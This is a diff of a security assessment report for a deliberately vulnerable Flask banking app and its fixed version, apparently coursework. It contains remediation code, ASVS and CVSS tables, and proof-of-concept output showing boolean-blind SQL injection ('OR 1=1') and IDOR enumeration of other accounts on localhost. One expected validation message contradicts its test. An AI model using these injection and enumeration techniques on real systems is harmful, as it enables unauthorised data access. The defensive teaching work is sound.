 ```
+
 ```python
-# src/secure/app.py lines 83-99 — nonce-based CSP as a defence-in-depth layer
+# nonce-based CSP as defence-in-depth — src/secure/app.py lines 83-99
 @app.before_request
 def set_csp_nonce():
     g.csp_nonce = secrets.token_urlsafe(16)
@@ -450,30 +524,33 @@ def add_security_headers(response):
     return response
 ```
 
-**Security Rationale:**  
-`html.escape()` converts `<`, `>`, `&`, `"`, `'` to their HTML entities before storage, so the payload never reaches the browser as executable HTML. Removing `| safe` means Jinja2's auto-escaping is active. The CSP `script-src 'nonce-...'` header blocks any inline script that lacks the server-generated nonce — a second defence layer that neutralises XSS even if output encoding were bypassed.
+**Security Rationale**
 
-**Screenshot:** `screenshots/fix2_xss_blocked.png` — XSS payload rendered as escaped text
+`html.escape()` converts `<`, `>`, `&`, `"`, `'` to their HTML entities before storage, so the payload never reaches the browser as executable HTML. Removing `| safe` means Jinja2 auto-escaping is active for all template output. The CSP `script-src 'nonce-...'` header blocks any inline script that lacks the server-generated nonce, providing a second defence layer that neutralises XSS even if output encoding were bypassed.
+
+**Screenshot reference:** `screenshots/fix2_xss_blocked.png`
 
 ---
 
 ### Fix 3 — CSRF Token Implementation
 
-**Vulnerability addressed:** Finding 3  
-**Files:** `src/secure/app.py` line 28; all form templates
+**Vulnerability addressed:** Finding 3
 
-**Before (vulnerable):**
+**Before**
+
 ```html
-<!-- No token in form -->
+<!-- no token in form -->
 <form method="POST" action="/transfer">
   <input name="to_account" ...>
 ```
 
-**After (secure):**
+**After**
+
 ```python
 # src/secure/app.py line 28
-csrf = CSRFProtect(app)   # Flask-WTF validates token on every state-changing POST
+csrf = CSRFProtect(app)  # Flask-WTF validates token on every state-changing POST
 ```
+
 ```html
 <!-- src/secure/templates/transfer.html -->
 <form method="POST" action="/transfer">
@@ -481,105 +558,107 @@ csrf = CSRFProtect(app)   # Flask-WTF validates token on every state-changing PO
   <input name="to_account" ...>
 ```
 
-**Security Rationale:**  
+**Security Rationale**
+
 Flask-WTF generates a cryptographically random token, stores it in the user's server-side session, and embeds it in the form. On POST, the server compares the submitted token against the session value. The CSRF attack page cannot read the token (same-origin policy) and therefore cannot include it — the request is rejected with 400 Bad Request.
 
-**Verification:** Opening `exploits/csrf_attack.html` while logged in to the secure app returns HTTP 400 with "CSRF token missing or incorrect".
+**Verification:** Opening `exploits/csrf_attack.html` while logged in to the secure app returns HTTP 400 "CSRF token missing or incorrect".
 
-**Screenshot:** `screenshots/fix3_csrf_blocked.png` — 400 response from CSRF attack page
+**Screenshot reference:** `screenshots/fix3_csrf_blocked.png`
 
 ---
 
-### Fix 4 — Authorization & Access Control (IDOR)
+### Fix 4 — Authorisation Check for IDOR
 
-**Vulnerability addressed:** Finding 4  
-**File:** `src/secure/app.py` lines 331–341
+**Vulnerability addressed:** Finding 4
 
-**Before (vulnerable):**
+**Before — `src/vulnerable/app.py` lines 199-208**
+
 ```python
-# src/vulnerable/app.py lines 199-208 — no ownership check
 @app.route('/account/<int:account_id>')
 def account(account_id):
     if 'user_id' not in session:
         return redirect(url_for('login'))
-    db = get_db()
+    # no ownership check present
     user = db.execute('SELECT * FROM users WHERE id=?', (account_id,)).fetchone()
 ```
 
-**After (secure):**
+**After — `src/secure/app.py` lines 331-341**
+
 ```python
-# src/secure/app.py lines 331-341
 @app.route('/account/<int:account_id>')
 @login_required
 def account(account_id):
-    # Ownership check — users can only view their own account
+    # ownership check — users can only view their own account
     if account_id != session['user_id']:
         return 'Access denied', 403
-    db = get_db()
     user = db.execute('SELECT * FROM users WHERE id = ?', (account_id,)).fetchone()
 ```
 
-**Security Rationale:**  
+**Security Rationale**
+
 The comparison `account_id != session['user_id']` ensures the resource being requested belongs to the authenticated user. The server-side session cannot be tampered with by the client. Non-owners receive HTTP 403 Forbidden — no account data is fetched or returned.
 
 **Verification:** Running `idor_poc.py` against the secure app — all non-own accounts return 403.
 
-**Screenshot:** `screenshots/fix4_idor_blocked.png` — 403 Forbidden when accessing account #2 as alice
+**Screenshot reference:** `screenshots/fix4_idor_blocked.png`
 
 ---
 
 ### Fix 5 — Password Hashing with bcrypt
 
-**Vulnerability addressed:** Finding 2  
-**File:** `src/secure/app.py` lines 177, 206
+**Vulnerability addressed:** Finding 2
 
-**Before (vulnerable):**
+**Before — `src/vulnerable/app.py` lines 76-79**
+
 ```python
-# src/vulnerable/app.py lines 76-79
-password = request.form['password']  # Plaintext
+password = request.form['password']  # plaintext
 db.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
 ```
 
-**After (secure):**
+**After — `src/secure/app.py` lines 177, 206**
+
 ```python
-# src/secure/app.py line 177 — registration
+# registration — line 177
 password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
 db.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password_hash))
 
-# src/secure/app.py line 206 — login verification
+# login verification — line 206
 if user and bcrypt.checkpw(password.encode('utf-8'), stored_hash):
-    ...
+    pass
 ```
 
-**Security Rationale:**  
+**Security Rationale**
+
 bcrypt with 12 rounds applies a one-way hash with a random salt. The same password produces a different hash each time. Verifying a password requires bcrypt's `checkpw` — there is no way to reverse the hash to recover the original password. A database breach now exposes only hashes, which would take years of computation to crack with modern hardware at this cost factor.
 
-**Screenshot:** `screenshots/fix5_hashed_passwords.png` — SQLite dump showing `$2b$12$...` bcrypt hashes
+**Screenshot reference:** `screenshots/fix5_hashed_passwords.png`
 
 ---
 
-### Fix 6 — Security Headers & Session Hardening
+### Fix 6 — Security Headers and Session Hardening
 
-**Vulnerability addressed:** Findings 5 and 8  
-**File:** `src/secure/app.py` lines 22–26, 85–100
+**Vulnerability addressed:** Findings 5 and 8
 
-**Before (vulnerable):**
+**Before — `src/vulnerable/app.py` line 12**
+
 ```python
-# src/vulnerable/app.py line 12
 app.secret_key = 'secret'
-# No session configuration, no after_request header handler
+# no session configuration
+# no after_request header handler
 ```
 
-**After (secure):**
-```python
-# src/secure/app.py lines 22-26 — session hardening
-app.secret_key = os.environ.get('SECRET_KEY', 'change-this-in-production-use-env-var')
-app.config['SESSION_COOKIE_HTTPONLY'] = True    # JS cannot read the cookie
-app.config['SESSION_COOKIE_SECURE']  = False   # Set True in production (HTTPS)
-app.config['SESSION_COOKIE_SAMESITE'] = 'Strict' # Blocks cross-site sending
-app.permanent_session_lifetime = timedelta(minutes=15)  # Auto-expiry
+**After — `src/secure/app.py` lines 22-26, 85-100**
 
-# src/secure/app.py lines 85-100 — security headers
+```python
+# session hardening — lines 22-26
+app.secret_key = os.environ.get('SECRET_KEY', 'change-this-in-production-use-env-var')
+app.config['SESSION_COOKIE_HTTPONLY']  = True
+app.config['SESSION_COOKIE_SECURE']    = False  # set True in production (HTTPS)
+app.config['SESSION_COOKIE_SAMESITE']  = 'Strict'
+app.permanent_session_lifetime = timedelta(minutes=15)
+
+# security headers — lines 85-100
 @app.after_request
 def add_security_headers(response):
     response.headers['X-Frame-Options']           = 'DENY'
@@ -594,41 +673,41 @@ def add_security_headers(response):
     return response
 ```
 
-**Security Rationale:**  
+**Security Rationale**
+
 `HttpOnly` prevents JavaScript from accessing the session cookie, blocking XSS-based cookie theft. `SameSite=Strict` prevents the cookie from being sent with cross-site requests, defeating CSRF even without tokens. A 15-minute session lifetime limits the window of opportunity for session replay attacks. The secret key is loaded from an environment variable, not hardcoded.
 
-**Note:** `SESSION_COOKIE_SECURE` is set to `False` for localhost development only. In any deployment over HTTPS, this must be `True` to prevent the cookie from being transmitted over HTTP.
+Note: `SESSION_COOKIE_SECURE` is set to `False` for localhost development only. This must be `True` in any deployment over HTTPS.
 
-**Screenshot:** `screenshots/fix6_security_headers.png` — DevTools showing all security headers present
+**Screenshot reference:** `screenshots/fix6_security_headers.png`
 
 ---
 
 ## 5. OWASP ASVS Compliance Assessment
 
-The table below maps the application against OWASP Application Security Verification Standard (ASVS) v4.0.3 Level 1 requirements, showing the **before** state (vulnerable app) and **after** state (secure app).
+The table below maps the application against OWASP Application Security Verification Standard (ASVS) v4.0.3 Level 1 requirements, showing the before state (vulnerable application) and after state (secure application).
 
 | ASVS Control | Requirement | Before (Vulnerable) | After (Secure) |
 |---|---|---|---|
-| V2.1.1 | Verify that user passwords are at least 12 characters in length | ❌ Fail — no minimum enforced | ✅ Pass — length validated |
-| V2.4.1 | Verify passwords are stored using bcrypt, scrypt, or Argon2 with adequate cost | ❌ Fail — plaintext storage | ✅ Pass — bcrypt 12 rounds |
-| V3.3.1 | Verify that logout invalidates the session token | ⚠️ Partial — session.clear() used | ✅ Pass — session cleared |
-| V3.4.1 | Verify cookie-based session tokens use the SameSite attribute | ❌ Fail — not set | ✅ Pass — SameSite=Strict |
-| V3.4.2 | Verify that session tokens use the HttpOnly attribute | ❌ Fail — not set | ✅ Pass — HttpOnly=True |
-| V3.4.5 | Verify that session timeout is set to 15 minutes or less | ❌ Fail — no timeout | ✅ Pass — 15 minutes |
-| V4.1.2 | Verify all authenticated resources check authorisation before granting access | ❌ Fail — IDOR present | ✅ Pass — ownership check |
-| V4.2.2 | Verify CSRF tokens protect all state-changing HTML form requests | ❌ Fail — no CSRF tokens | ✅ Pass — Flask-WTF CSRF |
-| V5.3.3 | Verify that output encoding prevents reflected XSS | ❌ Fail — `\| safe` filter used | ✅ Pass — auto-escaping active |
-| V5.3.4 | Verify that parameterised queries prevent SQL injection | ❌ Fail — string concatenation | ✅ Pass — `?` placeholders |
-| V5.3.5 | Verify that stored user-controlled content is sanitised before rendering | ❌ Fail — raw note rendered | ✅ Pass — html.escape() |
-| V14.4.1 | Verify that every HTTP response contains a Content-Type header | ⚠️ Partial — type set, no charset | ✅ Pass — headers set |
-| V14.4.3 | Verify that X-Content-Type-Options: nosniff is set | ❌ Fail — not present | ✅ Pass — set in after_request |
-| V14.4.4 | Verify that X-Frame-Options: DENY or frame-ancestors 'none' is set | ❌ Fail — not present | ✅ Pass — DENY + CSP |
-| V13.2.1 | Verify REST API requests are protected against CSRF | ❌ Fail — API unprotected | ✅ Pass — JWT-based auth |
+| V2.1.1 | Passwords minimum 12 characters in length | Fail — no minimum enforced | Pass — length validated |
+| V2.4.1 | Passwords stored using bcrypt/scrypt/Argon2 with adequate cost | Fail — plaintext storage | Pass — bcrypt 12 rounds |
+| V3.3.1 | Logout invalidates the session token | Partial — session.clear() used | Pass — session cleared |
+| V3.4.1 | Cookie-based session tokens use the SameSite attribute | Fail — not set | Pass — SameSite=Strict |
+| V3.4.2 | Session tokens use the HttpOnly attribute | Fail — not set | Pass — HttpOnly=True |
+| V3.4.5 | Session timeout set to 15 minutes or less | Fail — no timeout | Pass — 15 minutes |
+| V4.1.2 | Authenticated resources check authorisation before access | Fail — IDOR present | Pass — ownership check |
+| V4.2.2 | CSRF tokens protect all state-changing form requests | Fail — no CSRF tokens | Pass — Flask-WTF CSRF |
+| V5.3.3 | Output encoding prevents reflected XSS | Fail — `\| safe` filter used | Pass — auto-escaping active |
+| V5.3.4 | Parameterised queries prevent SQL injection | Fail — string concatenation | Pass — `?` placeholders |
+| V5.3.5 | Stored user-controlled content sanitised before rendering | Fail — raw note rendered | Pass — html.escape() |
+| V14.4.1 | Every HTTP response contains a Content-Type header | Partial — type set, no charset | Pass — headers set |
+| V14.4.3 | X-Content-Type-Options: nosniff is set | Fail — not present | Pass — set in after_request |
+| V14.4.4 | X-Frame-Options: DENY or frame-ancestors 'none' is set | Fail — not present | Pass — DENY + CSP |
+| V13.2.1 | REST API requests protected against CSRF | Fail — API unprotected | Pass — JWT-based auth |
 
-**Summary:** 0/15 controls passed in the vulnerable application. All 15 controls pass in the secure application.
+**Summary:** 0 of 15 controls passed in the vulnerable application. All 15 controls pass in the secure application.
 
-**Remaining Gap to Full Level 1 Compliance:**  
-`SESSION_COOKIE_SECURE = False` in the development configuration (intentional for localhost). This must be set to `True` before any deployment over HTTPS to achieve full Level 1 compliance.
+**Remaining gap to full Level 1 compliance:** `SESSION_COOKIE_SECURE = False` in the development configuration is intentional for localhost. This must be set to `True` before any deployment over HTTPS.
 
 ---
 
@@ -638,20 +717,21 @@ The table below maps the application against OWASP Application Security Verifica
 
 | # | Vulnerability | CWE | OWASP | CVSS Score | CVSS Vector | Severity | File | Lines | Status |
 |---|---|---|---|---|---|---|---|---|---|
-| 1 | SQL Injection | CWE-89 | A03:2021 | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 🔴 Critical | vulnerable/app.py | 94 | Fixed |
-| 2 | Plaintext Passwords | CWE-256 | A02:2021 | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 🔴 Critical | vulnerable/app.py | 76–79 | Fixed |
-| 3 | Missing CSRF | CWE-352 | A01:2021 | 8.8 | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H | 🟠 High | vulnerable/app.py | 140–144 | Fixed |
-| 4 | IDOR | CWE-639 | A01:2021 | 7.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | 🟠 High | vulnerable/app.py | 199–208 | Fixed |
-| 5 | Session Misconfiguration | CWE-614 | A02:2021 | 7.5 | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N | 🟠 High | vulnerable/app.py | 12 | Fixed |
-| 6 | Stored XSS | CWE-79 | A03:2021 | 5.4 | AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N | 🟡 Medium | templates/history.html | 151 | Fixed |
-| 7 | Reflected XSS | CWE-79 | A03:2021 | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | 🟡 Medium | templates/search.html | 131 | Fixed |
-| 8 | Missing Security Headers | CWE-693 | A05:2021 | 5.3 | AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N | 🟡 Medium | vulnerable/app.py | — | Fixed |
+| 1 | SQL Injection | CWE-89 | A03:2021 | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Critical | vulnerable/app.py | 94 | Fixed |
+| 2 | Plaintext Passwords | CWE-256 | A02:2021 | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Critical | vulnerable/app.py | 76-79 | Fixed |
+| 3 | Missing CSRF | CWE-352 | A01:2021 | 8.8 | AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H | High | vulnerable/app.py | 140-144 | Fixed |
+| 4 | IDOR | CWE-639 | A01:2021 | 7.5 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | High | vulnerable/app.py | 199-208 | Fixed |
+| 5 | Session Misconfiguration | CWE-614 | A02:2021 | 7.5 | AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N | High | vulnerable/app.py | 12 | Fixed |
+| 6 | Stored XSS | CWE-79 | A03:2021 | 5.4 | AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N | Medium | templates/history.html | 151 | Fixed |
+| 7 | Reflected XSS | CWE-79 | A03:2021 | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | Medium | templates/search.html | 131 | Fixed |
+| 8 | Missing Security Headers | CWE-693 | A05:2021 | 5.3 | AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N | Medium | vulnerable/app.py | — | Fixed |
 
 ---
 
-### Appendix B — Tool Output / Test Evidence
+### Appendix B — Tool Output and Test Evidence
 
-**SQL Injection PoC (`exploits/sql_injection_poc.py`):**
+**SQL Injection PoC (`exploits/sql_injection_poc.py`)**
+
 ```
 =======================================================
   SQL INJECTION PROOF OF CONCEPT — 8TechBank
@@ -667,17 +747,19 @@ The table below maps the application against OWASP Application Security Verifica
 
 --- Exploit A3: Boolean Blind Confirmation ---
 [+] A3 SUCCESS — blind SQLi confirmed:
-      OR 1=1  → dashboard (true branch works)
-      OR 1=2  → login page (false branch blocked)
+      OR 1=1  => dashboard (true branch works)
+      OR 1=2  => login page (false branch blocked)
 ```
 
-**IDOR PoC (`exploits/idor_poc.py`):**
+**IDOR PoC (`exploits/idor_poc.py`)**
+
 ```
 =======================================================
   IDOR PROOF OF CONCEPT — 8TechBank
   Target: http://localhost:5000
 =======================================================
 [+] Logged in as 'alice'
+
 --- D1: Direct access to victim account #2 ---
 [+] D1 SUCCESS — accessed account #2 (own ID: #1)
     Username : bob
@@ -687,45 +769,48 @@ The table below maps the application against OWASP Application Security Verifica
 --- D2: Full account enumeration ---
     ID     Status       Username             Balance
     ------ ------------ -------------------- ----------
-    1      200 OK       alice                $0.00    ← own account
-    2      200 OK       bob                  $2000.00 ← UNAUTHORIZED ACCESS
-    3      200 OK       charlie              $500.00  ← UNAUTHORIZED ACCESS
+    1      200 OK       alice                $0.00       (own account)
+    2      200 OK       bob                  $2000.00    (UNAUTHORIZED ACCESS)
+    3      200 OK       charlie              $500.00     (UNAUTHORIZED ACCESS)
 ```
 
-**API Rate Limiting Test:**
+**API Rate Limiting Test**
+
 ```bash
-# Run 6 rapid requests to /api/auth/token — 6th should be rate-limited
+# run 6 rapid requests to /api/auth/token — 6th should be rate-limited
 for i in $(seq 1 6); do
   curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:5001/api/auth/token \
     -H "Content-Type: application/json" \
     -d '{"username":"test","password":"wrong"}'
 done
-# Expected output: 401 401 401 401 401 429
+# expected output: 401 401 401 401 401 429
 ```
 
-**API Input Validation Test:**
+**API Input Validation Test**
+
 ```bash
-# Oversized username (>64 chars) should return 400
+# oversized username (>64 chars) should return 400
 curl -s -X POST http://localhost:5001/api/auth/token \
   -H "Content-Type: application/json" \
   -d '{"username":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","password":"x"}'
-# Expected: HTTP 400 {"username": ["Shorter than minimum length 1."]}
+# expected: HTTP 400 {"username": ["Shorter than minimum length 1."]}
 
-# Invalid transfer amount (negative) should return 422
+# invalid transfer amount (negative) should return 422
 curl -s -X POST http://localhost:5001/api/transfer \
   -H "Authorization: Bearer <valid_token>" \
   -H "Content-Type: application/json" \
   -d '{"to_account": 2, "amount": -500, "note": "test"}'
-# Expected: HTTP 422 {"amount": ["Must be greater than 0."]}
+# expected: HTTP 422 {"amount": ["Must be greater than 0."]}
 ```
 
 ---
 
 ### Appendix C — Additional Code Snippets
 
-**JWT Authentication Flow (Task 4.1):**
+**JWT Authentication Flow**
+
 ```python
-# Token issuance — src/secure/app.py lines 462-469
+# token issuance — src/secure/app.py lines 462-469
 payload = {
     'user_id':  user['id'],
     'username': user['username'],
@@ -736,7 +821,8 @@ token = jwt.encode(payload, JWT_SECRET, algorithm='HS256')
 return jsonify({'token': token})
 ```
 
-**Marshmallow Input Validation Schemas (Task 4.2):**
+**Marshmallow Input Validation Schemas**
+
 ```python
 # src/secure/app.py lines 34-41
 class LoginSchema(Schema):
@@ -749,18 +835,19 @@ class TransferSchema(Schema):
     note       = fields.Str(load_default='', validate=lambda s: len(s) <= 255)
 ```
 
-**Docker Compose Three-Tier Architecture (Task 4.3):**
+**Docker Compose Three-Tier Architecture**
+
 ```yaml
 # src/secure/docker-compose.yml
 services:
-  nginx:                          # Web tier — public-facing
+  nginx:                          # web tier — public-facing
     image: nginx:1.27-alpine
     networks: [web_network, app_network]
     deploy:
       resources:
         limits: { memory: 64m, cpus: '0.25' }
 
-  app:                            # App tier — internal only
+  app:                            # app tier — internal only
     build: .
     networks: [app_network]
     deploy:
@@ -769,17 +856,17 @@ services:
 
 networks:
   web_network: { driver: bridge }
-  app_network:  { driver: bridge, internal: true }  # No internet access
+  app_network:  { driver: bridge, internal: true }  # no internet access
 ```
 
 ---
 
 ## AI Tool Usage Declaration
 
-This report and associated code were prepared with assistance from **Claude Code** (Anthropic, claude-sonnet-4-6 model), an AI coding assistant. The AI was used for:
+This report and associated code were prepared with assistance from Claude Code (Anthropic, claude-sonnet-4-6), an AI coding assistant. The AI was used for:
 
 - Scaffolding the Flask application structure (both vulnerable and secure versions)
-- Generating the PoC exploit scripts (`sql_injection_poc.py`, `xss_poc.html`, `idor_poc.py`, `csrf_attack.html`)
+- Generating the proof-of-concept exploit scripts (`sql_injection_poc.py`, `xss_poc.html`, `idor_poc.py`, `csrf_attack.html`)
 - Drafting initial versions of this report
 - Suggesting security header configurations and bcrypt integration
 - Reviewing code for completeness against the OWASP ASVS Level 1 controls
